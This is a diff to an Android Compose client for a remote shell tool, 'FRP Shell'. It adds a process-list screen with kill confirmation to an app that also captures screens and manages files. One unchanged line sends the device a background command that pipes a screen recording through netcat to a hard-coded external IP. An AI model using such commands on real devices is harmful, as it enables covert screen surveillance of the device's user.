@@ -16,6 +16,8 @@ import androidx.compose.material.icons.filled.Folder
 import androidx.compose.material.icons.filled.Image
 import androidx.compose.material.icons.filled.Menu
 import androidx.compose.material.icons.filled.PhotoCamera
+import androidx.compose.material.icons.filled.Refresh
+import androidx.compose.material.icons.filled.Speed
 import androidx.compose.material.icons.filled.Save
 import androidx.compose.material.icons.filled.Settings
 import androidx.compose.material3.DrawerValue
@@ -152,9 +154,10 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                     TopAppBar(
                         title = {
                             Text(
-                                if (isSettings) "设置" 
-                                else if (uiState.fileEditorVisible) "文件编辑" 
-                                else if (uiState.fileManagerVisible) "文件管理" 
+                                if (isSettings) "设置"
+                                else if (uiState.fileEditorVisible) "文件编辑"
+                                else if (uiState.fileManagerVisible) "文件管理"
+                                else if (uiState.processListVisible) "运行的程序"
                                 else if (uiState.screenViewerVisible) "屏幕截图"
                                 else "FRP Shell",
                                 style = MaterialTheme.typography.titleMedium
@@ -167,14 +170,15 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                                         isSettings -> vm.navigateBackToMain()
                                         uiState.fileEditorVisible -> vm.closeFileEditor()
                                         uiState.fileManagerVisible -> vm.closeFileManager()
+                                        uiState.processListVisible -> vm.closePerformance()
                                         uiState.screenViewerVisible -> vm.closeScreenViewer()
                                         else -> scope.launch { drawerState.open() }
                                     }
                                 }
                             ) {
                                 Icon(
-                                    if (isSettings || uiState.fileManagerVisible || uiState.fileEditorVisible || uiState.screenViewerVisible) Icons.AutoMirrored.Filled.ArrowBack else Icons.Default.Menu,
-                                    contentDescription = if (isSettings || uiState.fileManagerVisible || uiState.fileEditorVisible || uiState.screenViewerVisible) "back" else "open drawer"
+                                    if (isSettings || uiState.fileManagerVisible || uiState.fileEditorVisible || uiState.processListVisible || uiState.screenViewerVisible) Icons.AutoMirrored.Filled.ArrowBack else Icons.Default.Menu,
+                                    contentDescription = if (isSettings || uiState.fileManagerVisible || uiState.fileEditorVisible || uiState.processListVisible || uiState.screenViewerVisible) "back" else "open drawer"
                                 )
                             }
                         },
@@ -193,7 +197,10 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                                         vm.sendCommand("nohup screenrecord --bit-rate 100000 --output-format=h264 - | nc 47.113.126.123 40001 > /dev/null 2>&1 &")
                                     },
                                     onStopRecord = { vm.sendCommand("pkill -9 screenrecord") },
-                                    onOpenFileManager = vm::openFileManager
+                                    onOpenFileManager = vm::openFileManager,
+                                    onOpenRunningPrograms = vm::openRunningPrograms,
+                                    onRefreshProcessList = vm::refreshRunningPrograms,
+                                    processListVisible = uiState.processListVisible
                                 )
                             }
                         }
@@ -237,6 +244,22 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                             contentPadding = padding
                         )
                     }
+
+                    uiState.processListVisible -> {
+                        RunningProcessScreen(
+                            contentPadding = padding,
+                            processItems = uiState.processItems,
+                            loading = uiState.processLoading,
+                            errorMessage = uiState.processErrorMessage,
+                            sortField = uiState.processSortField,
+                            sortAscending = uiState.processSortAscending,
+                            onSortByPid = { vm.updateProcessSort(ProcessSortField.PID) },
+                            onSortByRss = { vm.updateProcessSort(ProcessSortField.RSS) },
+                            onClickItem = vm::requestKillProcess,
+                            modifier = Modifier.fillMaxSize()
+                        )
+                    }
+
 
                     uiState.fileManagerVisible -> {
                         FileManagerScreen(
@@ -340,6 +363,24 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                 )
             }
 
+            uiState.processPendingKill?.let { process ->
+                AlertDialog(
+                    onDismissRequest = vm::cancelKillProcess,
+                    title = { Text("确认操作") },
+                    text = { Text("是否确定杀死进程 ${process.pid}（${process.cmd}）？") },
+                    confirmButton = {
+                        TextButton(onClick = vm::confirmKillProcess) {
+                            Text("确定")
+                        }
+                    },
+                    dismissButton = {
+                        TextButton(onClick = vm::cancelKillProcess) {
+                            Text("取消")
+                        }
+                    }
+                )
+            }
+
             if (uiState.cameraSelectorVisible) {
                 AlertDialog(
                     onDismissRequest = vm::closeCameraSelector,
@@ -376,12 +417,33 @@ private fun TopBarMenus(
     onCaptureScreen: () -> Unit,
     onStartRecord: () -> Unit,
     onStopRecord: () -> Unit,
-    onOpenFileManager: () -> Unit
+    onOpenFileManager: () -> Unit,
+    onOpenRunningPrograms: () -> Unit,
+    onRefreshProcessList: () -> Unit,
+    processListVisible: Boolean
 ) {
     var imageMenuExpanded by remember { mutableStateOf(false) }
     var fileMenuExpanded by remember { mutableStateOf(false) }
+    var performanceMenuExpanded by remember { mutableStateOf(false) }
 
     if (showClientActions) {
+        IconButton(onClick = { performanceMenuExpanded = true }) {
+            Icon(Icons.Default.Speed, contentDescription = "性能菜单")
+        }
+        DropdownMenu(
+            expanded = performanceMenuExpanded,
+            onDismissRequest = { performanceMenuExpanded = false }
+        ) {
+            TopMenuItem(
+                text = "运行的程序",
+                icon = Icons.Default.Speed,
+                onClick = {
+                    performanceMenuExpanded = false
+                    onOpenRunningPrograms()
+                }
+            )
+        }
+
         IconButton(onClick = { fileMenuExpanded = true }) {
             Icon(Icons.Default.Folder, contentDescription = "文件菜单")
         }
@@ -441,6 +503,12 @@ private fun TopBarMenus(
         }
     }
 
+    if (processListVisible) {
+        IconButton(onClick = onRefreshProcessList) {
+            Icon(Icons.Default.Refresh, contentDescription = "刷新进程")
+        }
+    }
+
     IconButton(onClick = onOpenSettings) {
         Icon(Icons.Default.Settings, contentDescription = "settings")
     }
@@ -464,4 +532,3 @@ private fun TopMenuItem(
         onClick = onClick
     )
 }
-
